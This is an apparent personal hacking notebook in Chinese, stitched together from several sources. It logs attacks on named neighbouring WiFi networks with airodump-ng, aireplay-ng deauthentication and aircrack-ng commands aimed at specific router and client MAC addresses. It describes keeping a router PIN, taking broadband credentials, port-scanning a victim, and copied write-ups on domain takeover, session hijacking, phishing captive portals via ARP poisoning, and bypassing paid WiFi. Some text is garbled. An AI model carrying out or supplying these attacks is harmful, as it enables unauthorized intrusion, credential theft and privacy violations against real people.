    00:13:10:79:D4:9F  -77        6        0    0   6  54   WPA2 CCMP   PSK  linksys
    00:19:D0:24:92:1B  -84        4        0    0   4  54e. WPA2 CCMP   PSK  ChinaNGB-Cactus
    BC:46:99:C2:24:FC  -82        3        0    0   1  54e. WPA2 CCMP   PSK  HLZJ-807
    BC:46:99:73:D9:DA  -82        3        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_D9DA
    7C:08:D9:DB:2C:CA  -83        2        0    0   1  54e. WPA2 CCMP   PSK  ChinaNGB-602
    74:C3:30:07:DD:FE  -83        3        1    0  13  54e  WPA2 CCMP   PSK  huatuoyangsheng
    30:FC:68:8D:00:76  -83        1        0    0   1  54e. WPA2 CCMP   PSK  onshine
    E0:28:61:81:FA:20  -87        2        0    0  11  54e  WPA2 CCMP   PSK  ChinaNet-UXjM
    8C:F2:28:E1:D8:D6  -86        4        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_D8D6
    08:3F:BC:B0:B1:ED  -86        2        0    0   4  54e  WPA2 CCMP   PSK  ChinaNet-V7Su
    50:BD:5F:B5:01:C8  -87        2        0    0   1  54e. WPA2 CCMP   PSK  You Know Who 233
    8C:A6:DF:DD:69:9C  -88        3        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_699C
    54:BE:53:5A:B9:47  -87        2        0    0   5  54e  WPA2 CCMP   PSK  ChinaNet-6xkb
    C8:3A:35:58:95:48  -88        2        0    0   8  54e  WPA2 CCMP   PSK  Tenda_589548
    FC:10:C6:99:54:4B  -88        4        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-ZgbL
    F4:B8:A7:6C:34:BC  -87        3        0    0   6  54e  WPA2 CCMP   PSK  ChinaNet-TA5N
    30:D1:7E:AA:72:AC  -91        3        0    0   3  54e  WPA2 CCMP   PSK  ChinaNet-Ja2c
    44:F4:36:5D:A2:6F  -91        1        0    0   8  54e  WPA2 CCMP   PSK  ChinaNet-jdwR
    C8:3A:35:40:B9:08  -92        0        0    0   8  54e  WPA2 CCMP   PSK  Tenda_40B908



    🔵 MERCURY_210    E4:D3:32:B4:83:BC  CH 11 👹 不在字典里....

      🔸 抓包并查看连接设备:
      airodump-ng -c 11 --bssid E4:D3:32:B4:83:BC -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c 74:E5:43:06:24:D2 wlan0mon
      aireplay-ng -0 2 -a E4:D3:32:B4:83:BC -c C0:9F:05:FB:1F:A1 wlan0mon

      🔸rockyou字典中无密码: ..
      sudo aircrack-ng -a2 -b E4:D3:32:B4:83:BC -w /usr/share/wordlists/rockyou.txt /root/-15.cap


    🔵 TP-LINK_CF9B B8:F8:83:ED:CF:9B  11    👹 不在字典里....

    🔸 抓包并查看连接设备:
        airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a B8:F8:83:ED:CF:9B -c 40:40:A7:B2:26:41 wlan0mon

      🔸rockyou
      sudo aircrack-ng -a2 -b B8:F8:83:ED:CF:9B -w /usr/share/wordlists/rockyou.txt /root/-21.cap


    🔵 别看了，你连不上的 30:fc:68:3d:58:92  6  👹 不在字典中

      airodump-ng -c 6 --bssid 30:fc:68:3d:58:92 -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a 30:FC:68:3D:58:92 -c 8C:18:D9:5B:A3:DB wlan0mon
    
      🔸rockyou字典
      sudo aircrack-ng -a2 -b 30:fc:68:3d:58:92 -w /usr/share/wordlists/rockyou.txt /root/-17.cap



    🔵 顿�.��.海�.�    30:FC:68:47:C0:42 6     👹 无握手包..

    airodump-ng -c 6 --bssid 30:FC:68:47:C0:42 -w ~/ wlan0mon

    🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c 54:4E:90:C2:97:C3 wlan0mon
      aireplay-ng -0 2 -a 30:FC:68:47:C0:42 -c FC:1A:11:69:25:7E wlan0mon



    🔵 MERCURY_EFB0   E4:F3:F5:9A:EF:B0 13    👹 无握手包..
    airodump-ng -c 13 --bssid E4:F3:F5:9A:EF:B0 -w ~/ wlan0mon

    🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c F4:8B:32:09:25:91 wlan0mon
      aireplay-ng -0 2 -a E4:F3:F5:9A:EF:B0 -c 6C:5C:14:DD:5F:DB wlan0mon


    🔵 再看你也连不上 42:fc:68:3d:58:92  6  👹 无握手包...
      airodump-ng -c 6 --bssid 42:FC:68:3D:58:92 -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a 42:FC:68:3D:58:92 -c 18:21:95:E6:35:D5 wlan0mon


    🔵 ChinaNet-VTka   18:44:E6:73:CA:CF  2     👹 无连接设备
      airodump-ng -c 6 --bssid 18:44:E6:73:CA:CF -w ~/ wlan0mon


    🔵 MERCURY_CF00   E4:F3:F5:83:CF:00  CH 12   👹 无握手包...

    🔸 抓包并查看连接设备:
      airodump-ng -c 12 --bssid E4:F3:F5:83:CF:00 -w ~/ wlan0mon

    🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a E4:F3:F5:83:CF:00 -c A8:7C:01:77:77:27 wlan0mon


    🔵 Tenda_FDE198 C8:3A:35:FD:E1:98    11    👹 无握手包.....

      airodump-ng -c 11 --bssid C8:3A:35:FD:E1:98 -w ~/ wlan0mon

      aireplay-ng -0 20 -a C8:3A:35:FD:E1:98 -c FC:E9:98:1F:B2:F1 wlan0mon


    🔵 TP-LINK_CF9B   B8:F8:83:ED:CF:9B  11     👹 无握手包..
      airodump-ng -c 11 --bssid B8:F8:83:ED:CF:9B -w ~/ wlan0mon

    aireplay-ng -0 20 -a B8:F8:83:ED:CF:9B -c B0:89:00:A3:CA:27 wlan0mon



    🔵 TP-LINK_5E0C  ❌        8C:A6:DF:DE:5E:0C  CH 6

      🔸 抓包并查看连接设备:
      airodump-ng -c 6 --bssid 8C:A6:DF:DE:5E:0C -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a 8C:A6:DF:DE:5E:0C -c 1C:77:F6:65:35:0C wlan0mon




    🔵 MERCURY_F668 ❌     BC:5F:F6:0A:F6:68  CH 6

      🔸 抓包并查看连接设备:
      airodump-ng -c 6 --bssid BC:5F:F6:0A:F6:68 -w ~/ wlan0mon

      🔸 新开终端: 重启对方设备..
      aireplay-ng -0 2 -a BC:5F:F6:0A:F6:68 -c 78:02:F8:AE:07:4B wlan0mon

      也没有抓到握手包...


    🔵 MERCURY_DBBE302 ❌   1C:60:DE:AE:DB:BE  CH6

      🔸 抓包并查看连接设备:
      airodump-ng -c 6 --bssid 1C:60:DE:AE:DB:BE -w ~/ wlan0mon
      .... 没设备连接...














⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

干坏或者不坏的事情前先修改MAC...

wifi 和 路由器密码都有了. 然后我们可以....

一记录下pin码，31070003 保证即使主人再改密码也不用再次破解。
二导出路由备份文件，可以查看宽带账户密码，记录下来有很多用处。


路由器 ➜ dhcp服务器 ➜ 客户端列表 ➜ 
1	android-3dce3ed3285596ab	1C-7B-23-13-73-DC	192.168.11.101	01:37:57
2	YH-20160915GEDS	74-E5-43-06-24-D2	192.168.11.102	01:34:53


🔵 端口扫描

root@kali:~# nmap 192.168.11.102

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-06 00:00 EDT
Nmap scan report for 192.168.11.102
Host is up (0.020s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49160/tcp open  unknown
49163/tcp open  unknown
MAC Address: 74:E5:43:06:24:D2 (Liteon Technology)

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds

分析:  
135:  
139: window 打印/文件 共享. smb 协议.
445: 也是文件共享 和139 一样的作用.











🔵 漏洞评估

    使用著名的工具，比如Nessus和Open VAs，来进行漏洞评估。
    在漏洞评估时，我们注意到这里面许多系统运行着过时的第三方软件和操作系统，这些容易成为被攻击的目标。这个过程会比较耗时，因为自动化工具发现的许多漏洞都是误报，所以有必要仔细评价这些漏洞。


    漏洞评估暴露出许多潜在的漏洞，其中之一便是MS09-050漏洞，我们接着会尝试利用这个漏洞。



🔵 漏洞利用

    我们将使用著名的Windows漏洞（MS09-050，SMBv2允许任意代码执行），可以在这里找到。这个机器明显长时间没有维护，所以没有打补丁。

    在经过多次尝试后，我们终于想办法成功利用了漏洞，得到了一个本地管理员权限的shell。


为了能够持久访问这个被攻破的系统，我们创建了一个后门用户，并将之添加到本地管理员组中。
现在我们可以使用后门用户登录这个系统，然后进一步枚举这个系统。




🔵 后渗透

现在我们进入了一个域系统，并且添加了一个后门用户。让我们对这个系统进行后渗透攻击（post-exploitation）。我们的目的是拿到这个系统本地administrator的密码，然后检查是否能够用这个凭证登录域内的其它系统。

Mimikatz是一个著名的工具，它可以从LSASS中获取明文密码。然而，目标系统运行了杀软，它封锁了Mimikatz。而且，这个杀软使用了密码保护，意味着我们不能禁用它，也不能在白名单中添加mimikatz。

所以，我们决定使用Meterpreter shell来获取密码hash。为了得到meterpreter shell。我们将会创建一个恶意的Meterpreter载荷，在我们的攻击机上运行一个handler。现在我们把恶意的Meterpreter载荷放到我们攻击机的web服务器上，在攻破的系统上使用浏览器访问这个文件。




🔵 提升权限

现在我们有了一个域系统的本地administrator凭证。下一步就是看能不能用这个凭证访问其它的系统。我们再次使用netscan查找使用本地administrator凭证登录的目标。

正如我们看到的，域中许多其它系统使用了相同的用户名和密码。这意味着我们已经成功攻破了域里面多个系统。

接着，我们使用本地administrator凭证登录这些系统，用Mimikatz从这些系统中获取明文口令。本地administrator密码可以解锁杀软，并且可以暂时禁用它。下面的截屏显示了mimikatz命令的输出。如此，我们想办法从这些受影响的系统中收集到了多个域用户的凭证。



🔵 提升至域管权限

最后一步是把我们的后门用户的权限提升至域管理员，控制整个域。

在上一步，我们获取了许多域用户。其中之一便是域管理员。我们使用这个凭证登录域控系统，把我们的后门用户添加到域中，然后提权让它成为域管。



🔵 访问高价值目标

现在我们成为了域管理员，我们将访问网络中高价值的目标，揭示攻击的严重性。

在信息收集阶段，我们发现了目标网络的邮件服务器。MS-Exchange 2013是用来管理邮件服务器的。这意味可用链接http://webmailip/ecp来访问Exchange管理中心。

我们使用域管的凭证登录Exchange管理中心。我们现在可以让自己作为任何用户的代表，访问他们的邮箱。这意味着我们能够访问目标网络中顶级主管的邮件。




🔵 结论

在这篇文章中，我们看到了一个完整的渗透测试周期，我们一开始对这个机构一无所知，后来想办法进入了它的网络，攻破了一个域系统，拿到了administrator的hash，在破解了这个hash之后，我们能够突破多个系统，最后突破了域控。为了持久访问，我们创建了一个后门用户，把它加入域管。并且为了证明攻击的严重性，我们完全控制了用户的邮箱。

一次黑盒渗透测试暴露了整个机构的真实的安全情况。它帮助机构理解攻击怎样发生，如果攻击成功，会对运营造成多坏的影响。因此，周期性的审计对一个机构来说是非常重要的。

从渗透测试者的角度看，黑盒渗透测试是一次挑战和练习。他不仅测试了你的知识，还测试了你在困难条件下创造性思考的能力。











劫持DNS. 
    进行DNS劫持后，被劫持者的上网记录和登陆过的账号以及明文传输的密码都很容易获得。
    现在很多社交工具的密码已经不再通过明文传输，而且自行搭建DNS服务器的操作较为复杂，
    我们考虑下一步直接进行会话劫持。



简易嗅探:

    如同很多“菜鸟黑客”一样，小黑想要挖掘出小白更多的秘密。

    这时，他使用了一款强大的网络渗透软件：dSploit。dSploit是一款基于Android系统的功能十分全面强大的网络渗透工具，可以提供给网络安全工作人员检查网络的安全性。小黑这次主要使用了其中的“简易嗅探”“会话劫持”“脚本注入”这三个功能。

    经过对台式电脑的“简易嗅探”，小黑很轻松地得到了小白的QQ号：
    既然得到了QQ号，也就很轻松地依据QQ号，搜索到了小白的微信号。


    通过“简易嗅探”这个功能，小黑不仅掌握了小白的很多社交网站的账号，并且熟悉了小白经常浏览的一些网站，对于其使用电脑的习惯有了一个大致的轮廓：小白是一名沉迷于大菠萝3等网游中的单身青年，如同中国绝大多数网民一样，小白使用腾讯的社交软件和360的安全软件。偶尔喜欢用淘宝和京东购物，喜欢购买各种手办和模型，最近希望给自己添置一台笔记本电脑。并且由于小白是单身，因此频繁浏览某相亲网站，积极寻找对象。












会话劫持:

    “会话劫持”功能，顾名思义，就是可以将小白电脑上正在进行的操作劫持到自己的设备中，使得小黑在自己的手机上远程控制着小黑的台式机上的应用，而小白对这一切毫不知情。以邮箱为例，小黑可以在小白的邮箱中做任意的操作，如收发邮件等等。而且，由于小白的邮箱中存有之前找工作时投递的简历，因此小白的姓名，住址，生日，职业，手机号，身份证号，银行卡号，收入等敏感信息也都尽收小黑眼底了。

    同样的道理，小白登陆过的微博、人人、淘宝等帐号也都全部可以劫持，通过劫持后的帐号又能看到许多表面看不到的东西。

    如果要进一步攻击，小黑完全可以在小白电脑中再植入一个木马，通过键盘记录，可以很轻松地得到小白的很多账号密码甚至网银信息。不过，此时的小黑异常冷静，他知道自己的攻击目标已经达成，因此决定金盆洗手，并且决定通过一个善意的提醒，建议小白修改Wi-Fi密码，给这次渗透攻击的行动，划上一个完美的句号。

    这是通过dSploit的 “脚本注入”功能来实现的：小黑将事先编辑好的一段文字，通过Java脚本的形式，推送到小白的台式电脑上：


    此时的小白，正在淘宝上兴致勃勃地翻看手办模型，当他正准备打开一张商品大图详细观摩时，突然发现了这段文字：









我们在目标公司附近发现存在两个无线网络，经过确认一个是开放式的WiFi，通过Portal进行认证；另一个则是802.1X网络。我们来分别进行检测。



在连上这个开放式热点后，跳转到了Portal认证页面。

很快我们就发现了一个很普遍的“漏洞”，通过Portal登录返回信息,可以判断用户名是否存在。
根据他们的测试规则，可以看到用户名为姓名全拼。通过使用中国人姓名top1000，利用burp进行了爆破，抓取了一批存在的用户。我们利用这些存在的用户进行暴力破解。


可以从上图看到，对爆破做了限制,但是可以使用“多用户名，单密码”这样的策略，不会触发他们规则。很快获取到了一个账户密码，登录成功。有很多的Portal的ACL有问题，接入Portal直接分配到的IP可以访问内网的资源(对于对渗透人来说，能不能上网不关注，我只需要能接入你的内网就行了)，如果存在这种情况，就不用非得获取Portal的用户名密码。

经过分析发现，这个网络与企业的办公网络隔离，大致是提供给员工进行日常上网用的。对于这次的渗透目的来说，此网段并不能接触到我们的目标。我们将目光看向另一个无线网络，这个WiFi使用的是802.1x认证







🔵 Zabbix

Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案，
常见的漏洞有弱口令(admin Zabbix)、CVE-2013-5743等。

为什么说Zabbix我最喜欢呢，因为Zabbix在后台中可自定义脚本，执行命令(自身包含agent都可)。
Zabbix就像一个网吧的网管工具，通过它可以向客户端发送任何指令并执行，以黑客的角度来讲，这就是一个超级后门。
所以，在网段隔离的情况下，只要能搞定Zabbix，几乎就意味着拿下大批机器。


在利用私钥登录的某台机器上便发现存在Zabbix，在配置文件中找到了Zabbix的server地址，这时候任务转变为寻找Zabbix的账户密码。我们通过收集之前拿下多台机器的history中的信息，对Zabbix进行账号猜解，最终进入了Zabbix。（这里为了避免泄漏敏感信息，放上个来源网络的图）
















⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
免费使用公共wifi

如今越来越多的商场、咖啡店、饭店等公共场所都提供了开放的WiFi网络。不过有时即便我们的设备连上了WiFi，当随便打开一个网页就会立即弹出身份验证页面……是不是很郁闷？藉此新春佳节，小编将向大家分享几种绕过常见WiFi身份验证的方法，祝各位过个开心年。


需要身份认证的WiFi

这是一种开放的WiFi网络。在真正使用该网络之前，当访问任意网页时，通常你会遇到一个强制的身份认证的页面——只有在你输入了正确的用户名和密码之后才能开始使用该网络。

在我们的日常生活中，你可以发现各种强制身份认证页面，例如在麦当劳、医院、机场、公园等等。


Hack it！

首先你需要注意的是，既然是开放WiFi网络，那么你可以毫不费力地连接上它。不过这种WiFi会利用身份验证来限制合法用户上网。通常这种方式是为了防止网络被滥用，例如：防止人们下载色情内容，利用该网络进行非法活动等。

可不管怎样，当我们连上了，我们就可以扫描网络中所有主机并嗅探他们的通信流量。

绕过热点身份验证常用方法主要有以下几种，下面我们将逐一进行介绍。



1、MAC地址伪造法

    开放网络的身份验证通常是通过将你的上网设备的MAC地址同你的上网凭证（例如账号、密码）联系在一起来实现。

    然而，因为任何设备的MAC地址都很容易修改，例如笔记本电脑、智能手机等设备。所以这种验证方法并不是一种强健的或者安全的身份验证方法。

    我们首先要做的就是扫描整个网络，寻找其他已经连接上该网络的客户端。而实现该目的最快的方式是，利用ARP扫描技术，它会提供给我们一个包含所有已连接设备的IP地址和MAC地址的完整ARP表。

    现在，我们可以用上图中的MAC地址一个一个地尝试，以此来查看对应的客户端是否已经通过身份验证。

    为了提高查看的速度，我们可以尝试以下方法：
    1、检测这些设备是否能够产生通信流量。
    2、如果产生了流量，那么就拦截该流量并查看是否是上网的网络流量。

    有时这类WiFi对一个用户只提供一定时间或流量的免费服务。在这种情况下，一旦服务过期，我们可以通过随机修改MAC地址来继续享受该网络服务。




2、伪造认证页面

    这种方式类似于“钓鱼”：我们创建一个伪造身份认证页面，迫使正常用户登录该页面进行身份验证，然后我们就可以盗取他们的上网凭证。

    正如我之前所写，开放WiFi网络的所有流量都是未经加密的明文数据，所以我们可以拦截并篡改网络流量，做任何我们想做的事情。虽然有时认证页面是通过HTTPS连接，但是它们几乎所有时候都使用同一个定制的证书。

    为了建立一个假的认证门户，我们不得不下载原来真正的认证页面。你可以使用任何你喜欢的工具来下载，然后编辑该门户网站来存储用户输入的上网凭证信息。一旦我们保存了这些信息，我们应该将用户请求信息转发到原始真正的认证页面中进行身份认证。

    但是问题来了，我们该如何迫使用户登录我们伪造的认证门户，而不是原来真正的那个呢？

    最简单的方法是对所有客户端发起一次ARP中毒攻击，通知上网设备认证门户的MAC地址现在变成了我们自己的MAC地址。

    我们上搭建一个Web服务器，然后在上面做一个假的认证页面。至此工作完成，我们只要坐等用户名和密码就行啦。




3、利用“忘记密码”

这种方法很简单，一些带身份验证的WiFi热点会在你忘记密码的时候提供重置密码服务。

通常，这种服务通过你的手机号码来实现，会向你填入的手机号码上发送新密码。然而，也有很多时候是通过电子邮件发送新密码。

如果是这种情况，那么很可能他们会允许你连接你的邮件客户端到你的IMAP/POP邮件服务器，这意味着此时你可以免费使用他们的网络查看你的邮箱。更普遍的是，他们通常不会检查你所产生的流量是否真的是IMAP或POP流量（主要因为流量加密了）！

所以你可以在你的VPS上以端口号995或993搭建一个SSH服务器，这两个端口分别是POP3和IMAP加密流量默认的端口号。因此你完全可以创建一个SSH隧道来代理你的网络浏览。


4、DNS隧道方法

大多数时候，WiFi热点会允许你进行DNS查询，它们一般使用自己的DNS服务器，同时很多时候他们也允许你查询外部DNS服务器。

创建于几年前的一个比较有趣的项目“Iodine”就是一款有关DNS隧道的软件。使用该软件，你可以使用DNS协议创建一个连接到你的服务器上的隧道，然后利用它上网。

这多少有点类似于你用VPN连接到你办公室的网络。一旦你创建了该隧道，你可以再次设置一个代理，通过SSH隧道连接到你的服务器，这样你就可以得到一个加密的安全通道来上网。

不过，为了使用DNS隧道服务，还需要满足另一个要求，即你必须拥有一个域名或者能够使用一些动态DNS提供商的子域名。
























⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
wifi 破解2 . 之前的wifi 有时候会断...  莫名其妙的..  再破解一个..

🔵 ios 查看万能钥匙密码

tplink 云功能... 

如果，你的tp link路由器登录界面只有一个登录密码的文本框，那么这个型号的路由器就是没有默认密码的，因为在第一次设置的时候，就需要自己设置一个登录密码。如果这个时候记不起来登录密码，只能是重置路由器了。












⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
3070+6649 

Mac 安装3070网卡驱动:

参考文章1:  https://www.tonymacx86.com/threads/guide-installation-of-usb-wireless-antenna-chipset-rt2870-rt3070-in-mac-os-x-10-11-x-el-capitan.183175/
参考文章2:  http://www.xuenb.com/os/1486906623102251.html


下载 BearExtender 5.4              管理wifi的.
下载 EasyKext Utility              安装驱动的.
下载 RT2870USBWirelessDriver.kext  实际驱动


Installation (software)
1) Remove workaround first - RESTART
2) Remove old files - RESTART
如果之前没有安装过 BearExtender 那么可以跳过上面两步.

3) Install 5.4 (BearExtender) - DONT RESTART YET!
安装好后 不要点重启. 先把网卡插上.安装驱动后再重启.
4) Connect the USB Wireless Antenna


Installation (driver)
5) Run EasyKext Utility
6) Drag RT2870USBWirelessDriver.kext to it - RESTART

现在开机就出来个 无线管理界面. 选择一个就可以了!!!


下面来测试


3070 Mac 驱动.

用 bearextender 5.4 来安装驱动.
https://store.bearextender.com/pages/regarding-yosemite-compatiblity






⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️



🔵 MAC抓 IOS 万能钥匙 里面的密码!

	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
	按之前的办法 只能抓到 毫无作用的 mdns包. 根本没有ftp/tcp等等包.
	最佳方式: 用 rvictl命令.  需要安装 xcode!!!

	1、手机通过usb线连接到PC

	2、查看手机的UDID(设备唯一标识码): http://www.jianshu.com/p/20dbffe6a45d

	3. 终端去建立连接:		rvictl -s aff56c5351843780baa88d00237ea275d0639e5d
          Starting device aff56c5351843780baa88d00237ea275d0639e5d [SUCCEEDED] with interface rvi0

          这样，PC上就多了一个虚拟的端口rvi0
          现在 wireshark 可以选项里就多了一个rvi0网卡了!!!



下拉来说 怎么抓包.


先iphone 开启3g/4g 移动数据.  并给 wifi万能钥匙上网权限.
开始抓包.  选择一个有万能钥匙的wifi. 如果之前连过这个wifi 就手动忘记密码.
这样才能从 万能钥匙的数据库 重新获取 wifi密码..

开始连接wifi 到 成功连接wifi.  抓到 400+ 个包.  wifi 账户密码在哪..
初步过滤 not mdns && not icmp && not ipv6

程序和服务器通信 好像要先 
client hello
server hello
证书
传输数据.




先看wifi名字.linksys


首先查.. 万能钥匙的服务器ip.
打开万能钥匙上网. 抓数据包.  好像是 
106.75.60.77    
106.75.70.207
10.171.118.93




屏蔽了一个，屏蔽不了所有 APP ，你还不如直接过滤掉所有包含你 wifi 密码的请求（出口外网屏蔽掉，内网放行，应该不会影响日常使用）
Google Play 搜 Packet Capture ，手动找。
我记得有些路由器支持访客的临时密码哒。。。客人一走，关闭临时密码。。。这样更不用捣鼓。

屏蔽服务器也没用。 
密码输入过一次就记录在手机里，人家用你 WIFI 的时候无法分享。但是出去用其它网络的时候，还是可以分享记录过的 WIFI 。

深受其害，总是有同事装这个 app ，搞得公司 wifi 巨慢，说又不好说，唉


1)  首先将MAC电脑的以太网共享给airport，使iOS设备能够通过wifi连接

打开系统偏好设置，找到共享，选择internet共享，在右侧“通过以下方式将”选择以太网，“连接共享给其他电脑”选择airPort。

2)  打开paros ，设置paros的本地代理paros下载地址（http://www.parosproxy.org/）

在paros的tools－》options中选择local proxy，在Address 中输入AirPort的ip地址。输入端口8080。打开系统偏好设置，找到网络，选择左侧的AirPort，可以看到AirPort的地址为169.254.69.225，将该地址填入到上面提到的Address栏中。

3)  使用ios设备连接mac共享出来的网络：在iOS设备中，选择设置－》通用－》网络－》wifi，找到共享的网络，加入。然后在该网络的纤细内容中的http代理部分，选择手动，输入paros中设置的代理ip和端口。

4)  下面就可以使用paros来监控iOS设备的网络，我们打开Safiri，在paros中即可察看到网络的所有请求。







很明显，这几条黑色的包和它们下面的包，就是应用的请求和服务器的回应了。我们点击其中一条请求，看看它的请求格式：
看到没有？Full Request URI，就是请求的网址。双击它，在浏览器中打开，可以看到是一条json数据，哈哈，初步成功！

总结一下基本方法：让iPhone通过笔记本联网，然后使用Wireshark抓包，通过过滤器过滤抓到的包，找到请求地址，分析请求格式。over！


估计数据包被加密了..


network={
    ssid=
    key = 
    psk = 

}


...





对了 开发 IOS的app 是需要证书的. 所有数据从iphone app 到app服务器 应该是经过加密的....

怎么看数据是否被加密. md5 rsa 

数据的安全性至关重要，而仅仅用 POST 请求提交用户的隐私数据，还是不能完全解决安全问题。因此：我们经常会用到加密技术，比如说在登录的时候，我们会先把密码用 MD5 加密再传输给服务器 或者 直接对所有的参数进行加密再 POST 到服务器。



1.数据安全介绍

最基础的是我们发送网络请求时，使用get和post方式发送请求。两者具体区别就不做解释了，只是引出相关安全性问题

get：将参数暴露在外，（绝对不安全-->明文请求或者傻瓜式请求）。
post：将参数放到请求体body中，（相对于get比较安全-->但是我们可以很容易用一些软件截获请求数据。比如说Charles（青花瓷））
Charles（大部分app的数据来源都使用该工具来抓包，并做网络测试）

注意：Charles在使用中的乱码问题，可以显示包内容，然后打开info.plist文件，找到java目录下面的VMOptions，在后面添加一项：-Dfile.encoding=UTF-8
这里提供一个青花瓷破解版下载途径，供大家学习使用，商务需求，也请支持正版。
数据安全的原则

在网络上不允许传输用户隐私数据的明文,（即:App网络传输安全，指对数据从客户端传输到Server中间过程的加密，防止网络世界当中其他节点对数据的窃听）。
在本地不允许保存用户隐私数据的明文,（即:App数据存储安全，主要指在磁盘做数据持久化的时候所做的加密）。
App代码安全,（即:包括代码混淆，加密或者app加壳）。
要想非常安全的传输数据，建议使用https。抓包不可以，但是中间人攻击则有可能。建议双向验证防止中间人攻击，可以参考下文篇章。










